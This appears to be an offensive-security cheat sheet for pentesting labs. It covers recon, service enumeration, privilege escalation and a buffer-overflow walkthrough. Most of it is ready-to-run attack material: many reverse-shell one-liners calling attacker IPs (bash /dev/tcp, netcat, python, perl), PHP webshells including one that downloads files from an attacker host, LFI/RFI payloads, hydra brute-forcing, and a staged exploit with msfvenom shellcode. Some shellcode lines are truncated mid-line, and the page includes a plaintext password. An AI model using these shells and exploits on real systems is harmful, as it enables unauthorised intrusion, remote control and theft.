# a no-bullshit offsec guide 

### disclaimer:
The information on this website is for educational purposes only. The author of this work will not be held accountable for any use or misuse of the information on this website. As there is always some risk involved, the author is not responsible for any effects or consequences from the use of any suggestions, recommendations, or procedures described herein. 

# setting up your workstation

## dump windows 
 

- linux is open source, that means you have millions of lines of code at your disposal for free.

- modular applications and libraries in linux 

- super fast boot time

- no annoying updates 

- lightening fast on low ram

- free

- portable, yes even on a usb

- secure

- most tools are written in linux

- most web servers run in linux due to its stability


- easier to use than mainstream opinion


[installation guide for virtualization](https://phoenixnap.com/kb/how-to-install-kali-linux-on-virtualbox)

[installation guide for main os](https://techsprobe.com/how-to-install-kali-linux-2020-on-a-laptop-pc/)


## secure your kali installation

- change your default root password

- change your default ssh keys

- add an unprivileged user to work on, give it sudo rights with a password

- change your mac address with macchanger

- install tor and proxychains

- install anonsurf

- check open ports on your localhost (sudo ss -tulwn)

- close unnecessary ports/services (sudo service <service name> stop)


[guide to secure kali](https://alphacybersecurity.tech/how-to-secure-your-kali-linux-machine/)

[guide to secure kali further](https://thehacktoday.com/how-to-protect-yourself-while-hacking-in-kali-linux/)




# the methodology i follow


**initial scoping**

**recon**

**enumerate -> exploit**

**reverse shell**

**upgrade shell**

**enumerate the target**

**escalate privileges and gain root**


## scoping
clearly understand which targets your have permission to scan/attack, do not break the law as it would hamper your reputation as a security researcher

## recon

recon wide to gather information on as many potential attack surfaces as possible

### 1. masscan

fast full port scanner
```
masscan -i tun0 -p1-65535 --rate=1000 IP
```
  
### 2. nmap

this handy little tool lets you see which ports are open on the target along with other information about the target

```
nmap -sTV -v -p- IP
sudo nmap -sU -v IP

 ``` 
 
### 3. nmapAutomater
 
a useful script to automate the scanning process

```
 ./nmapAutomater.sh IP All
 ./nmapAutomater.sh IP Vulns
 ./nmapAutomater.sh IP Quick
 ./nmapAutomater.sh IP Full
```

shoutout to @21y4d for this

[check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)

## enumerate -> exploit

upgrade searchsploit 

```
searchsploit -u
searchsploit <service>

google site:exploitdb <service version>
google service version exploit
```

### 1. HTTP  80, 8000, 8080

```
nikto -h IP
curl -i http(s)://IP/robots.txt
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.18 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -V
```

- fire up dirbuster with a medium wordlist

- browse the site with a burpsuite proxy running

- look for SQL injection parameters in GET/POST

- LFI with ?file=foo parameter

- /etc/passwd /etc/shadow

- /var/www/html/config.php

- ?page=php://filter/convert.base64-encode/resource=../config.php

- ../../../../../boot.ini for version
- http://target.com/?page=./../../../../../../../../../etc/passwd%00

- RFI backdoor

- access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php

- phpinfo()

- password bruteforce

```
- <?php include $_GET['inc']; ?>
```



### 2. HTTPS 443

```
sslscan https://192.168.1.10/
```
- check out potential usernames in the ssl cert and the correct vhost
- look for heartbleed vuln

### 3. FTP 21 TFTP UDP 69

```
ftp IP
anonymous:anonymous
nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn IP

```
- anonymous login
- vulns in version
- traverse filesystem look for password files, system configs, BOF targets, OS version
- check upload potential



### 4. SMB 139,445

```
enum4linux -a IP
smbclient -L IP
locate *.nse | grep smb
nmap -p 139,445 --script=$scriptname IP
nmap -p 139,445 --script=smb-vuln* IP -v
enum4linux -a $targetip
enum4linux -a $targetip
smbmap -H $targetip
smbclient \\\\IP\\tmp
rpcclient -U "" -N 10.10.10.3
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
smbmap -H IP -u tyler -p '92g!mA8BGjOirkL%OG*&'
nbtscan -r IP/24
sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* IP
psexec to login to samba
smbclient -L 192.168.1.10
smbclient \\IP\ipc$ -U administrator
smbclient //IP/ipc$ -U administrator
smbclient //IP/admin$ -U administrator

```
-check if exploitable by msf


### 4. SNMP UDP 161

```
snmp-check
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
onesixtyone -c community -i ips
snmpwalk -c public -v1 IP
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
```

### 5. SSH 22

-usually a secondary access point

### 6. SMTP/Email 25, 110/995 or 143/993

```
nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn IP

telnet IP 110
USER user
PASS pass

LIST
RETR message number
QUIT
```
- useful for enumerating users
- check versions and use searchsploit



### 7. LDAP 389

```
ldapsearch -x -h IP -p389 -s base namingcontexts
nmap -p 389 --script ldap-search IP
```

### 8. DNS 53

modify /etc/hosts file for individual dns resolution
modify /etc/resolv.conf for nameserver resolution overall
```
nslookup
SERVER <ip>
<ip>

dig axfr subdomain @IP
```


### 9. RPC 135

-metasploit exploit for ms-rpc: exploit/windows/dcerpc/ms05_017_msmq
```
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum IP 
```


### 10. MySQL 3306

```
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP

mysql --host=IP -u root -p
```

## reverse shell

- creating a php backdoor shell

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f raw
```

- bash 

```
bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
```

- perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- php

```
php -r '$sock=fsockopen("10.10.14.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- php rce

```
<?php echo system($_REQUEST['zu']); ?>
```

- php one liner

```
<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.40/4444 0>&1’"); ?>
```

- php webshell one liner

```
<?php system($_REQUEST['cmd']); ?>
```

- php webshell for windows, upload and execute

```
<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.42:8000/" . $_REQUEST['fupload']));
  };

  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
EOF;
```

- phpadmin shell

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

- ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- netcat

```
nc -e /bin/sh 10.0.0.1 1234
```

- netcat for outdated systems

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
```

- netcat for windows

```
nc64.exe 10.10.14.42 4444 -e cmd.exe
```

- java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war > zuk3y.war
```
- SUID C Shell

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- iis aspx reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

- [php web shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from www.pentestmonkey.net



## upgrading shell 

- upgrade reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```
- find your own term value: ```echo $TERM```
- export your term value```export TERM=<your own term value>```
- ctrl+z to background the shell
- enable passing keyboard shorcuts```stty raw -echo```
- foreground the process:```fg```
- reset ```reset```

## privilege escalation

### linux

```
sudo -l
uname -ar
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {}\;
cat /proc/version
cat /etc/issue
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
- [linenum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) for automated privilege escalation checks


### windows

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

- [winpeas.bat](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat)

- [jaws.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1)

running within cmd

```
CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```
running within powershell

```
PS C:\temp> .\jaws-enum.ps1
```


# buffer overflow

- fuzzing
- finding the offset
- overwriting the eip
- finding bad characters
- finding the right module
- generating shellcode -> root

### fuzz.py

```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A"*100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('<IP>',<port>))
                
                s.send(('TRUN /.:/'+buffer)) #trun command
                s.close()
                sleep(1)
                buffer=buffer+"A"*100
                
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

### offset.py

- /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 5000

```
#!/usr/bin/python
import sys, socket
from time import sleep

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af>


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))

                s.send(('TRUN /.:/'+ offset)) 
                s.close()


except:
                print "Error Connecting to server"
                sys.exit()
```

### overwrite.py


```
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A"*2003 + "B"*4


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```

### badchars.py


```
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A"*2003 + "B"*4 +badchars


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```

### module.py

- use !mona jmp -r esp to find the hex value to overwrite on the EIP
- !mona modules to select the right module without memory protections
- view modules -> find command JMP ESP (FFE4)
- little endian rules

```
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A"*2003 + "\xaf\x11\x50\x62" #this could be different (little endian)


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```

### shellcode.py

- generate shellcode with

```
msfvenom -p windows/shell_reverse_tcp -lhost=yourip -lport=yourport -f c -a x86 EXITFUNC=thread -b "\x00(badchars)"
```
```
  GNU nano 4.9.3     shellcode.py                
#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xda\xcf\xd9\x74\x24\xf4\xba\xcb\xe>
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x9b\xf1\x14\x6>
"\x92\x17\xdf\x3b\x1a\xf2\xee\x7b\x78\x77\x40\x4>
"\x27\x5e\xcd\xe6\x45\x77\xe2\x4f\xe3\xa1\xcd\x5>
"\xd3\xa3\xc6\xae\xea\x6b\x1b\xaf\x2b\x91\xd6\xf>
"\x11\x80\xa8\x55\x9a\xda\x3d\xde\x7f\xaa\x3c\xc>
"\xcf\xd1\x65\x13\x46\xc9\x6a\x1e\x10\x62\x58\xd>
"\x15\x0f\x8b\x1c\xe4\x51\xcc\x9b\x17\x24\x24\xd>
"\xa2\x70\xb5\xe7\x05\xf2\x6d\xc3\xb4\xd7\xe8\x8>
"\xce\xdf\x23\x53\x65\xdb\xa8\x52\xa9\x6d\xea\x7>
"\x19\x34\x93\x1f\x25\x26\x7c\xff\x83\x2d\x91\x1>
"\xd9\xf3\x8e\xfe\x75\x83\xfd\xcc\xda\x3f\x69\x7>
"\x82\x89\x5e\xe0\x7d\x32\x9f\x29\xba\x66\xcf\x4>
"\x91\x94\xd2\x0b\xc1\x3a\x8d\xeb\xb1\xfa\x7d\x8>
"\xb4\xe4\xde\xca\x5f\x1f\x89\x34\x37\x1e\x25\xd>
"\x41\xc2\xc6\xac\x69\x82\x51\x59\x13\x8f\x29\xf>
"\x3a\x56\xaa\xa9\xf5\x9f\xc7\xb9\x62\x50\x92\xe>
"\x8b\xaa\xe2\xd7\x4b\xa4\x1e\x40\x1c\xe1\xd1\x9>
"\x30\xee\xdd\x0d\x7b\xaa\x39\xee\x82\x33\xcf\x4>
"\x52\xed\x17\xc5\x05\xbb\xc1\xa3\xff\x0d\xbb\x7>
"\xfb\x9f\xd7\x2d\x04\xca\xa1\xd1\xb5\xa3\xf7\xe>
"\x97\x66\xd4\xff\x42\x23\xf4\x1d\x46\x5e\x9d\xb>
"\x3b\xfe\x20\xfd\xbf\x0a\xd9\xfa\xa0\x7f\xdc\x4>
"\xd8\x02\x92\x03\xd8\x06")

shellcode = "A"*2003 + "\xaf\x11\x50\x62" +"\x90"*32 +overflow


try:
                s=socket.socket(socket.AF_INET,s>
                s.connect(('192.168.1.110',9999))

                s.send(('TRUN /.:/'+ shellcode))
                s.close()

except:
                print "Error Connecting"
                sys.exit()



```

## compiling exploits


- compiling windows exploits


```
i686-w64-mingw32-gcc exploit.c -o exploit
```

- for 32 bit


```
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
```
- [precompiled windows-kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
